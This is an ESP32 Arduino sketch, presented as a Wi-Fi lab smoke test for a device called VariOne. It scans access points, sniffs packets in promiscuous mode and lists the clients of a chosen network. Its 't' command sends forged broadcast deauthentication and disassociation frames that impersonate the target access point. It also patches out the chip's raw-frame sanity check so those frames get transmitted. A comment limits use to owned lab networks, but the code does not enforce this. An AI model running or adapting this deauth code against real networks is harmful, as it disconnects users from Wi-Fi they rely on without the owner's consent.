// Wi-Fi lab smoke test for VariOne. Isolates ESP32 Wi-Fi scan, promiscuous
// monitor, client discovery, SoftAP channel lock, and selected-target raw-frame
// TX diagnostics over serial without touching main firmware.

#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"

extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
  return 0;
}

struct ApInfo {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  int32_t channel;
  wifi_auth_mode_t enc;
};

struct ClientInfo {
  uint8_t mac[6];
};

static ApInfo aps[20];
static int apCount = 0;
static int selectedAp = -1;
static ClientInfo clients[16];
static volatile int clientCount = 0;
static volatile uint32_t pktCount = 0;
static bool clientScanActive = false;
static uint8_t selectedBssid[6] = {0};

static void macToString(const uint8_t* mac, char* out, size_t outSize) {
  snprintf(out, outSize, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static void printHelp() {
  Serial.println();
  Serial.println("[WIFI-TEST] commands:");
  Serial.println("  h       help");
  Serial.println("  s       scan APs");
  Serial.println("  0-9     select AP index");
  Serial.println("  m       monitor packets on selected AP channel for 6s");
  Serial.println("  c       discover clients for selected AP for 10s");
  Serial.println("  a       start hidden SoftAP on selected AP channel");
  Serial.println("  x       stop WiFi");
  Serial.println("  t       selected-target TX diag: 20 deauth/disassoc frames to selected BSSID only");
  Serial.println("[WIFI-TEST] TX diag requires selected AP from scan; use only lab/owned AP.");
  Serial.println();
}

static void listAps() {
  if (apCount == 0) {
    Serial.println("[WIFI-TEST] no APs stored; run s");
    return;
  }
  for (int i = 0; i < apCount; i++) {
    char bssid[18];
    macToString(aps[i].bssid, bssid, sizeof(bssid));
    Serial.printf("[WIFI-TEST] #%02d ch=%2d rssi=%4d enc=%d bssid=%s ssid=\"%s\"%s\n",
                  i, aps[i].channel, aps[i].rssi, aps[i].enc, bssid,
                  aps[i].ssid.c_str(), i == selectedAp ? "  <selected>" : "");
  }
}

static void scanAps() {
  Serial.println("[WIFI-TEST] scan start");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(120);
  int found = WiFi.scanNetworks(false, true);
  if (found < 0) found = 0;
  apCount = min(found, 20);
  for (int i = 0; i < apCount; i++) {
    aps[i].ssid = WiFi.SSID(i);
    memcpy(aps[i].bssid, WiFi.BSSID(i), 6);
    aps[i].rssi = WiFi.RSSI(i);
    aps[i].channel = WiFi.channel(i);
    aps[i].enc = WiFi.encryptionType(i);
  }
  for (int i = 0; i < apCount - 1; i++) {
    for (int j = i + 1; j < apCount; j++) {
      if (aps[j].rssi > aps[i].rssi) {
        ApInfo tmp = aps[i];
        aps[i] = aps[j];
        aps[j] = tmp;
      }
    }
  }
  selectedAp = apCount > 0 ? 0 : -1;
  WiFi.scanDelete();
  Serial.printf("[WIFI-TEST] scan found=%d selected=%d\n", apCount, selectedAp);
  listAps();
}

static void promiscuousCountCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  (void)buf;
  if (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA || type == WIFI_PKT_CTRL) pktCount++;
}

static void startPromiscuous(wifi_promiscuous_cb_t cb, int channel) {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(80);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

static void stopPromiscuous() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
}

static void monitorSelected() {
  if (selectedAp < 0) {
    Serial.println("[WIFI-TEST] select AP first");
    return;
  }
  pktCount = 0;
  int ch = aps[selectedAp].channel;
  Serial.printf("[WIFI-TEST] monitor start ch=%d ssid=\"%s\"\n", ch, aps[selectedAp].ssid.c_str());
  startPromiscuous(promiscuousCountCb, ch);
  uint32_t start = millis();
  uint32_t last = start;
  while (millis() - start < 6000) {
    if (millis() - last >= 1000) {
      last = millis();
      Serial.printf("[WIFI-TEST] monitor t=%lus packets=%lu\n",
                    (millis() - start) / 1000, (unsigned long)pktCount);
    }
    delay(10);
  }
  stopPromiscuous();
  WiFi.mode(WIFI_OFF);
  Serial.printf("[WIFI-TEST] monitor done packets=%lu\n", (unsigned long)pktCount);
}

static void clientScanCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!clientScanActive) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  uint16_t fc = p[0] | (p[1] << 8);
  bool toDS = fc & 0x0100;
  bool fromDS = fc & 0x0200;
  const uint8_t* addr1 = p + 4;
  const uint8_t* addr2 = p + 10;
  const uint8_t* addr3 = p + 16;
  const uint8_t* client = nullptr;

  if (!toDS && !fromDS) {
    if (memcmp(addr3, selectedBssid, 6) == 0 && !(addr2[0] & 0x01)) client = addr2;
  } else if (!toDS && fromDS) {
    if (memcmp(addr2, selectedBssid, 6) == 0 && !(addr1[0] & 0x01)) client = addr1;
  } else if (toDS && !fromDS) {
    if (memcmp(addr1, selectedBssid, 6) == 0 && !(addr2[0] & 0x01)) client = addr2;
  }
  if (!client || clientCount >= 16) return;
  for (int i = 0; i < clientCount; i++) {
    if (memcmp((const void*)clients[i].mac, client, 6) == 0) return;
  }
  memcpy((void*)clients[clientCount].mac, client, 6);
  clientCount++;
}

static void discoverClients() {
  if (selectedAp < 0) {
    Serial.println("[WIFI-TEST] select AP first");
    return;
  }
  memcpy(selectedBssid, aps[selectedAp].bssid, 6);
  memset((void*)clients, 0, sizeof(clients));
  clientCount = 0;
  clientScanActive = true;
  char bssid[18];
  macToString(selectedBssid, bssid, sizeof(bssid));
  Serial.printf("[WIFI-TEST] client scan start ssid=\"%s\" bssid=%s ch=%d\n",
                aps[selectedAp].ssid.c_str(), bssid, aps[selectedAp].channel);
  startPromiscuous(clientScanCb, aps[selectedAp].channel);
  uint32_t start = millis();
  while (millis() - start < 10000) {
    delay(50);
  }
  clientScanActive = false;
  stopPromiscuous();
  WiFi.mode(WIFI_OFF);

  Serial.printf("[WIFI-TEST] client scan done count=%d\n", clientCount);
  for (int i = 0; i < clientCount; i++) {
    char mac[18];
    macToString(clients[i].mac, mac, sizeof(mac));
    Serial.printf("[WIFI-TEST] client #%02d %s\n", i, mac);
  }
}

static esp_err_t sendMgmt(uint8_t subtype, const uint8_t* addr1, const uint8_t* addr2, const uint8_t* addr3, uint16_t reason) {
  uint8_t frame[26] = {0};
  frame[0] = subtype;
  frame[1] = 0x00;
  frame[2] = 0x3A;
  frame[3] = 0x01;
  memcpy(frame + 4, addr1, 6);
  memcpy(frame + 10, addr2, 6);
  memcpy(frame + 16, addr3, 6);
  frame[22] = 0xF0;
  frame[23] = 0xFF;
  frame[24] = reason & 0xFF;
  frame[25] = (reason >> 8) & 0xFF;
  return esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true);
}

static void selectedTxDiag() {
  if (selectedAp < 0) {
    Serial.println("[WIFI-TEST] select AP first");
    return;
  }
  const uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
  char bssid[18];
  macToString(aps[selectedAp].bssid, bssid, sizeof(bssid));
  Serial.printf("[WIFI-TEST] TX diag target ssid=\"%s\" bssid=%s ch=%d frames=20\n",
                aps[selectedAp].ssid.c_str(), bssid, aps[selectedAp].channel);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("vari_test_hidden", nullptr, aps[selectedAp].channel, true);
  delay(120);
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(aps[selectedAp].channel, WIFI_SECOND_CHAN_NONE);

  int ok = 0;
  int fail = 0;
  esp_err_t last = ESP_OK;
  for (int i = 0; i < 10; i++) {
    last = sendMgmt(0xC0, broadcast, aps[selectedAp].bssid, aps[selectedAp].bssid, 7);
    if (last == ESP_OK) ok++; else fail++;
    last = sendMgmt(0xA0, broadcast, aps[selectedAp].bssid, aps[selectedAp].bssid, 8);
    if (last == ESP_OK) ok++; else fail++;
    delay(20);
  }
  Serial.printf("[WIFI-TEST] TX diag done ok=%d fail=%d last_err=0x%X\n", ok, fail, (unsigned)last);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
}

static void startSoftApOnSelectedChannel() {
  if (selectedAp < 0) {
    Serial.println("[WIFI-TEST] select AP first");
    return;
  }
  WiFi.mode(WIFI_AP);
  WiFi.softAP("vari_test_hidden", nullptr, aps[selectedAp].channel, true);
  IPAddress ip = WiFi.softAPIP();
  Serial.printf("[WIFI-TEST] SoftAP hidden ch=%d ip=%s stations=%d\n",
                aps[selectedAp].channel, ip.toString().c_str(), WiFi.softAPgetStationNum());
}

void setup() {
  Serial.begin(115200);
  delay(1200);
  Serial.println("VariOne WiFi lab smoke test boot");
  printHelp();
}

void loop() {
  if (!Serial.available()) return;
  char c = Serial.read();
  if (c == 'h') printHelp();
  else if (c == 's') scanAps();
  else if (c >= '0' && c <= '9') {
    int idx = c - '0';
    if (idx >= 0 && idx < apCount) {
      selectedAp = idx;
      Serial.printf("[WIFI-TEST] selected=%d ssid=\"%s\" ch=%d\n", selectedAp, aps[selectedAp].ssid.c_str(), aps[selectedAp].channel);
    } else {
      Serial.println("[WIFI-TEST] bad index");
    }
  } else if (c == 'm') monitorSelected();
  else if (c == 'c') discoverClients();
  else if (c == 'a') startSoftApOnSelectedChannel();
  else if (c == 't') selectedTxDiag();
  else if (c == 'x') {
    stopPromiscuous();
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
    Serial.println("[WIFI-TEST] WiFi off");
  }
}
